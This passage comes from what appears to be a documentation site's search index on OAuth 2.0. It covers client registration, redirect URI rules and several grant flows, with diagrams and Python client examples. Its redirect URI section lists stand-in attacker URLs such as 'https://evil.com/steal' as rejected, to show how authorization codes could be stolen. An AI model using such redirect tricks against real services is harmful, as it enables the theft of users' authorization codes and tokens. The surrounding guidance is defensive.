\u2502\n     \u2502   \"scope\": \"read write\"                                \u2502\n     \u2502 }                                                       \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502                                                         \u2502 Validate &amp; Create\n     \u2502                                                         \u2502\n     \u2502 Response:                                              \u2502\n     \u2502 {                                                       \u2502\n     \u2502   \"client_id\": \"s6BhdRkqt3\",                           \u2502\n     \u2502   \"client_secret\": \"ZJYCqe3GGRvdrudKyZS0XhGv...\",      \u2502\n     \u2502   \"client_id_issued_at\": 1234567890,                   \u2502\n     \u2502   \"client_secret_expires_at\": 1234657890,              \u2502\n     \u2502   \"redirect_uris\": [...],                              \u2502\n     \u2502   \"grant_types\": [...],                                \u2502\n     \u2502   \"response_types\": [...]                              \u2502\n     \u2502 }                                                       \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n</code></pre>"},{"location":"security/oauth/#registration-information","title":"Registration Information","text":"<p>Required Information:</p> Field Description Example client_id Unique identifier for the client <code>abc123xyz456</code> client_secret Secret key (confidential clients only) <code>secret_abc123...</code> redirect_uris Allowed callback URLs after authorization <code>[\"https://app.com/callback\"]</code> application_name Human-readable name \"My Photo App\" application_type Type of client <code>web</code>, <code>native</code>, <code>spa</code> grant_types Allowed OAuth flows <code>[\"authorization_code\", \"refresh_token\"]</code> response_types Allowed response types <code>[\"code\"]</code> scopes Permissions the client can request <code>[\"read:user\", \"write:user\"]</code> <p>Optional Information: - logo_uri: URL to application logo - tos_uri: Terms of service URL - policy_uri: Privacy policy URL - contacts: Developer contact emails - jwks_uri: JSON Web Key Set URL for token validation</p>"},{"location":"security/oauth/#redirect-uri-security","title":"Redirect URI Security","text":"<p>Critical Security Requirement: Redirect URIs must be explicitly registered to prevent authorization code interception.</p> <pre><code>Valid Redirect URIs:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2705 https://app.example.com/callback\n\u2705 https://app.example.com/oauth/callback\n\u2705 myapp://callback (mobile app custom scheme)\n\u2705 http://localhost:3000/callback (development only)\n\nInvalid/Risky Patterns:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u274c https://app.example.com/* (wildcard not allowed)\n\u274c http://app.example.com/callback (HTTP in production)\n\u274c https://evil.com/callback (not registered)\n\u274c https://app.example.com/callback?param=value (query params)\n\nAttack Prevention:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nIf attacker tries: https://evil.com/steal\n\u2192 Authorization server checks registered URIs\n\u2192 Redirect URI doesn't match\n\u2192 Request REJECTED\n\u2192 Attack prevented!\n</code></pre>"},{"location":"security/oauth/#post-registration-steps","title":"Post-Registration Steps","text":"<ol> <li> <p>Secure Storage:    <pre><code>Confidential Clients (Server-side):\n- Store client_secret in environment variables\n- Use secret management services (AWS Secrets Manager, HashiCorp Vault)\n- Never commit to version control\n\nPublic Clients:\n- Only client_id needed\n- Can be in client-side code\n- Use PKCE for additional security\n</code></pre></p> </li> <li> <p>Configure Application:    <pre><code>// Server-side (Confidential)\nconst oauth2Config = {\n  client_id: process.env.OAUTH_CLIENT_ID,\n  client_secret: process.env.OAUTH_CLIENT_SECRET,\n  redirect_uri: 'https://yourapp.com/callback',\n  authorization_endpoint: 'https://auth-server.com/oauth/authorize',\n  token_endpoint: 'https://auth-server.com/oauth/token'\n};\n\n// Client-side (Public)\nconst oauth2Config = {\n  client_id: 'abc123xyz456', // Public, can be in code\n  redirect_uri: 'https://yourapp.com/callback',\n  authorization_endpoint: 'https://auth-server.com/oauth/authorize',\n  token_endpoint: 'https://auth-server.com/oauth/token',\n  usePKCE: true // Always use PKCE for public clients\n};\n</code></pre></p> </li> <li> <p>Test the Integration:</p> </li> <li>Use development/sandbox environment first</li> <li>Verify redirect URIs work correctly</li> <li>Test token exchange process</li> <li>Validate scope permissions</li> </ol>"},{"location":"security/oauth/#client-management","title":"Client Management","text":"<p>Update Client Configuration: - Modify redirect URIs - Update scopes - Rotate client secrets (confidential clients) - Change application metadata</p> <p>Revoke/Delete Client: - Immediately invalidates all tokens - Remove client from authorization server - Users must re-authorize if client is re-registered</p> <p>Monitor Client Activity: - Track token issuance rates - Monitor failed authentication attempts - Audit scope usage - Detect suspicious patterns</p>"},{"location":"security/oauth/#real-world-examples","title":"Real-World Examples","text":"<p>Google OAuth Registration: 1. Go to Google Cloud Console 2. Create a new project 3. Enable OAuth 2.0 APIs 4. Configure OAuth consent screen 5. Create credentials (OAuth 2.0 Client ID) 6. Specify application type and redirect URIs 7. Receive <code>client_id</code> and <code>client_secret</code></p> <p>GitHub OAuth Registration: 1. Go to Settings \u2192 Developer settings \u2192 OAuth Apps 2. Click \"New OAuth App\" 3. Fill in application details and callback URL 4. Receive <code>client_id</code> and <code>client_secret</code></p> <p>Auth0 Registration: 1. Create an Auth0 account 2. Create a new application 3. Choose application type (SPA, Web, Native) 4. Configure allowed callback URLs 5. Receive <code>client_id</code> and <code>client_secret</code></p>"},{"location":"security/oauth/#oauth-20-grant-types-flows","title":"OAuth 2.0 Grant Types (Flows)","text":""},{"location":"security/oauth/#1-authorization-code-flow","title":"1. Authorization Code Flow","text":"<p>Best for: Server-side web applications (confidential clients)</p> <p>Description: The most secure and commonly used flow. The client receives an authorization code which is then exchanged for an access token.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User    \u2502                                          \u2502  Authorization   \u2502\n\u2502 (Browser)\u2502                                          \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) User clicks \"Login with Google\"                    \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) Redirect to Authorization Server                   \u2502\n     \u2502    with client_id, redirect_uri, scope, state          \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) User authenticates &amp; grants permission             \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (4) Redirect to Client with authorization code         \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                          \u2502\n\u2502   Client         \u2502                                          \u2502\n\u2502  (Backend)       \u2502                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                          \u2502\n     \u2502                                                         \u2502\n     \u2502 (5) Exchange code for access token                     \u2502\n     \u2502    POST with code, client_id, client_secret            \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (6) Return access_token &amp; refresh_token                \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (7) Use access token to call API                       \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Resource       \u2502\n\u2502    Server        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Flow Steps: 1. User initiates login 2. Client redirects to authorization server with parameters 3. User authenticates and grants permission 4. Authorization server redirects back with authorization code 5. Client exchanges code for access token (server-to-server) 6. Authorization server returns access token and refresh token 7. Client uses access token to access protected resources</p> <p>Parameters: - <code>response_type=code</code> - <code>client_id</code>: Your application's identifier - <code>redirect_uri</code>: Where to redirect after authorization - <code>scope</code>: Requested permissions - <code>state</code>: CSRF protection token</p> <p>Python Implementation Example:</p> <pre><code>import requests\nimport secrets\nfrom urllib.parse import urlencode, urlparse, parse_qs\nfrom flask import Flask, request, redirect, session\n\napp = Flask(__name__)\napp.secret_key = 'your-secret-key'\n\n# OAuth 2.0 Configuration\nCLIENT_ID = 'your_client_id'\nCLIENT_SECRET = 'your_client_secret'\nAUTHORIZATION_URL = 'https://auth-server.com/oauth/authorize'\nTOKEN_URL = 'https://auth-server.com/oauth/token'\nREDIRECT_URI = 'http://localhost:5000/callback'\nSCOPE = 'read:user write:user'\n\n@app.route('/login')\ndef login():\n    \"\"\"Step 1: Redirect user to authorization server\"\"\"\n    # Generate state for CSRF protection\n    state = secrets.token_urlsafe(32)\n    session['oauth_state'] = state\n\n    # Build authorization URL\n    params = {\n        'response_type': 'code',\n        'client_id': CLIENT_ID,\n        'redirect_uri': REDIRECT_URI,\n        'scope': SCOPE,\n        'state': state\n    }\n\n    authorization_url = f\"{AUTHORIZATION_URL}?{urlencode(params)}\"\n    return redirect(authorization_url)\n\n@app.route('/callback')\ndef callback():\n    \"\"\"Step 2: Handle callback and exchange code for token\"\"\"\n    # Verify state to prevent CSRF\n    state = request.args.get('state')\n    if state != session.get('oauth_state'):\n        return 'Invalid state parameter', 400\n\n    # Get authorization code\n    code = request.args.get('code')\n    if not code:\n        error = request.args.get('error', 'Unknown error')\n        return f'Authorization failed: {error}', 400\n\n    # Exchange code for access token\n    token_data = {\n        'grant_type': 'authorization_code',\n        'code': code,\n        'redirect_uri': REDIRECT_URI,\n        'client_id': CLIENT_ID,\n        'client_secret': CLIENT_SECRET\n    }\n\n    response = requests.post(TOKEN_URL, data=token_data)\n\n    if response.status_code == 200:\n        tokens = response.json()\n        access_token = tokens['access_token']\n        refresh_token = tokens.get('refresh_token')\n\n        # Store tokens securely (use encrypted session/database in production)\n        session['access_token'] = access_token\n        session['refresh_token'] = refresh_token\n\n        return 'Login successful! Access token obtained.'\n    else:\n        return f'Token exchange failed: {response.text}', 400\n\n@app.route('/api/user')\ndef get_user():\n    \"\"\"Step 3: Use access token to call protected API\"\"\"\n    access_token = session.get('access_token')\n    if not access_token:\n        return 'Not authenticated', 401\n\n    # Call protected API with access token\n    headers = {'Authorization': f'Bearer {access_token}'}\n    response = requests.get('https://api-server.com/user', headers=headers)\n\n    if response.status_code == 200:\n        return response.json()\n    elif response.status_code == 401:\n        # Token expired, need to refresh\n        return 'Token expired', 401\n    else:\n        return f'API call failed: {response.text}', response.status_code\n\nif __name__ == '__main__':\n    app.run(debug=True, port=5000)\n</code></pre>"},{"location":"security/oauth/#2-implicit-flow-deprecated","title":"2. Implicit Flow (Deprecated)","text":"<p>Best for: Previously used for SPAs (now deprecated in favor of Authorization Code + PKCE)</p> <p>Description: Access token is returned directly in the URL fragment without an intermediate authorization code.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User    \u2502                                          \u2502  Authorization   \u2502\n\u2502 (Browser)\u2502                                          \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) Redirect to Authorization Server                   \u2502\n     \u2502    with response_type=token                            \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) User authenticates &amp; grants permission             \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Redirect with access token in URL fragment         \u2502\n     \u2502    http://client.com/callback#access_token=xyz         \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n\n\u26a0\ufe0f  DEPRECATED: Not recommended due to security concerns\n    - Tokens exposed in browser history\n    - No refresh tokens\n    - Use Authorization Code + PKCE instead\n</code></pre>"},{"location":"security/oauth/#3-resource-owner-password-credentials-flow","title":"3. Resource Owner Password Credentials Flow","text":"<p>Best for: Trusted first-party applications only (not recommended for third-party apps)</p> <p>Description: User provides credentials directly to the client application, which exchanges them for an access token.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User    \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 (1) User enters username &amp; password directly in app\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502                                  \u2502  Authorization   \u2502\n\u2502  (Application)   \u2502                                  \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (2) POST request with:                                 \u2502\n     \u2502     - grant_type=password                              \u2502\n     \u2502     - username                                         \u2502\n     \u2502     - password                                         \u2502\n     \u2502     - client_id &amp; client_secret                        \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Validate credentials                               \u2502\n     \u2502                                                         \u2502\n     \u2502 (4) Return access_token &amp; refresh_token                \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n\n\u26a0\ufe0f  USE WITH CAUTION:\n    - Only for highly trusted applications (own company apps)\n    - User credentials exposed to client\n    - No OAuth benefits for third-party apps\n</code></pre> <p>When to use: - Mobile apps for your own service - Migration from legacy authentication systems - Testing and development</p> <p>Python Implementation Example:</p> <pre><code>import requests\nfrom typing import Dict, Optional\n\nclass PasswordGrantClient:\n    def __init__(self, client_id: str, client_secret: str, token_url: str):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.token_url = token_url\n        self.access_token = None\n        self.refresh_token = None\n\n    def authenticate(self, username: str, password: str, scope: str = '') -&gt; Dict:\n        \"\"\"Authenticate using username and password\"\"\"\n        token_data = {\n            'grant_type': 'password',\n            'username': username,\n            'password': password,\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'scope': scope\n        }\n\n        response = requests.post(self.token_url, data=token_data)\n\n        if response.status_code == 200:\n            tokens = response.json()\n            self.access_token = tokens['access_token']\n            self.refresh_token = tokens.get('refresh_token')\n            return tokens\n        else:\n            raise Exception(f'Authentication failed: {response.text}')\n\n    def call_api(self, api_url: str, method: str = 'GET', data: Optional[Dict] = None) -&gt; Dict:\n        \"\"\"Make authenticated API request\"\"\"\n        if not self.access_token:\n            raise Exception('Not authenticated')\n\n        headers = {'Authorization': f'Bearer {self.access_token}'}\n\n        if method == 'GET':\n            response = requests.get(api_url, headers=headers)\n        elif method == 'POST':\n            response = requests.post(api_url, headers=headers, json=data)\n        else:\n            raise ValueError(f'Unsupported method: {method}')\n\n        response.raise_for_status()\n        return response.json()\n\n# Usage Example\nif __name__ == '__main__':\n    client = PasswordGrantClient(\n        client_id='your_client_id',\n        client_secret='your_client_secret',\n        token_url='https://auth-server.com/oauth/token'\n    )\n\n    try:\n        # Authenticate\n        tokens = client.authenticate(\n            username='user@example.com',\n            password='user_password',\n            scope='read write'\n        )\n        print(f\"Access Token: {tokens['access_token']}\")\n\n        # Call protected API\n        user_data = client.call_api('https://api-server.com/user')\n        print(f\"User Data: {user_data}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n</code></pre>"},{"location":"security/oauth/#4-client-credentials-flow","title":"4. Client Credentials Flow","text":"<p>Best for: Server-to-server (machine-to-machine) authentication</p> <p>Description: Client authenticates using its own credentials, no user involvement.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502                                  \u2502  Authorization   \u2502\n\u2502  (Application/   \u2502                                  \u2502     Server       \u2502\n\u2502   Service)       \u2502                                  \u2502                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) POST request with:                                 \u2502\n     \u2502     - grant_type=client_credentials                    \u2502\n     \u2502     - client_id                                        \u2502\n     \u2502     - client_secret                                    \u2502\n     \u2502     - scope (optional)                                 \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) Validate client credentials                        \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Return access_token                                \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (4) Use access token to call API                       \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Resource       \u2502\n\u2502    Server        \u2502\n\u2502   (API)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Use Cases: - Microservices authentication - Batch jobs accessing APIs - Background services - Server-to-server API calls</p> <p>Characteristics: - No user context or refresh tokens - Client acts on its own behalf - Tokens typically short-lived</p> <p>Python Implementation Example:</p> <pre><code>import requests\nimport time\nfrom typing import Dict, Optional\nfrom threading import Lock\n\nclass ClientCredentialsClient:\n    def __init__(self, client_id: str, client_secret: str, token_url: str, scope: str = ''):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.token_url = token_url\n        self.scope = scope\n        self.access_token = None\n        self.token_expiry = 0\n        self._lock = Lock()\n\n    def get_access_token(self) -&gt; str:\n        \"\"\"Get valid access token, refreshing if necessary\"\"\"\n        with self._lock:\n            # Check if token is still valid (with 60s buffer)\n            if self.access_token and time.time() &lt; (self.token_expiry - 60):\n                return self.access_token\n\n            # Request new token\n            return self._request_token()\n\n    def _request_token(self) -&gt; str:\n        \"\"\"Request new access token using client credentials\"\"\"\n        token_data = {\n            'grant_type': 'client_credentials',\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'scope': self.scope\n        }\n\n        response = requests.post(self.token_url, data=token_data)\n\n        if response.status_code == 200:\n            tokens = response.json()\n            self.access_token = tokens['access_token']\n            expires_in = tokens.get('expires_in', 3600)\n            self.token_expiry = time.time() + expires_in\n            return self.access_token\n        else:\n            raise Exception(f'Token request failed: {response.text}')\n\n    def call_api(self, api_url: str, method: str = 'GET', data: Optional[Dict] = None) -&gt; Dict:\n        \"\"\"Make authenticated API request\"\"\"\n        access_token = self.get_access_token()\n        headers = {'Authorization': f'Bearer {access_token}'}\n\n        if method == 'GET':\n            response = requests.get(api_url, headers=headers)\n        elif method == 'POST':\n            response = requests.post(api_url, headers=headers, json=data)\n        elif method == 'PUT':\n            response = requests.put(api_url, headers=headers, json=data)\n        elif method == 'DELETE':\n            response = requests.delete(api_url, headers=headers)\n        else:\n            raise ValueError(f'Unsupported method: {method}')\n\n        response.raise_for_status()\n        return response.json() if response.content else {}\n\n# Usage Example - Microservice to Microservice Communication\nif __name__ == '__main__':\n    # Initialize client\n    client = ClientCredentialsClient(\n        client_id='service-a-client-id',\n        client_secret='service-a-secret',\n        token_url='https://auth-server.com/oauth/token',\n        scope='api:read api:write'\n    )\n\n    try:\n        # Call another service's API\n        data = client.call_api('https://service-b.com/api/data')\n        print(f\"Data from Service B: {data}\")\n\n        # Create resource on another service\n        new_resource = client.call_api(\n            'https://service-b.com/api/resource',\n            method='POST',\n            data={'name': 'New Resource', 'value': 123}\n        )\n        print(f\"Created: {new_resource}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n</code></pre>"},{"location":"security/oauth/#5-device-authorization-grant-device-code-flow","title":"5. Device Authorization Grant (Device Code Flow)","text":"<p>Best for: Devices with limited input capabilities (Smart TVs, IoT devices)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Device       \u2502                                  \u2502  Authorization   \u2502\n\u2502  (Smart TV)      \u2502                                  \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) POST to /device/code endpoint                      \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) Return device_code, user_code,                     \u2502\n     \u2502     verification_uri                                   \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Display: \"Go to google.com/device                  \u2502\n     \u2502              and enter code: ABCD-1234\"                \u2502\n     \u2502                                                         \u2502\n     \u2502                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u2502\n     \u2502                           \u2502  User    \u2502                 \u2502\n     \u2502                           \u2502 (Phone)  \u2502                 \u2502\n     \u2502                           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                 \u2502\n     \u2502                                \u2502                       \u2502\n     \u2502                                \u2502 (4) Visit URL         \u2502\n     \u2502                                \u2502     Enter code        \u2502\n     \u2502                                \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 \u2502\n     \u2502                                \u2502                       \u2502\n     \u2502                                \u2502 (5) Authenticate      \u2502\n     \u2502                                \u2502     &amp; authorize       \u2502\n     \u2502                                \u2502                       \u2502\n     \u2502 (6) Poll for token                                     \u2502\n     \u2502    (every few seconds)                                 \u2502\n     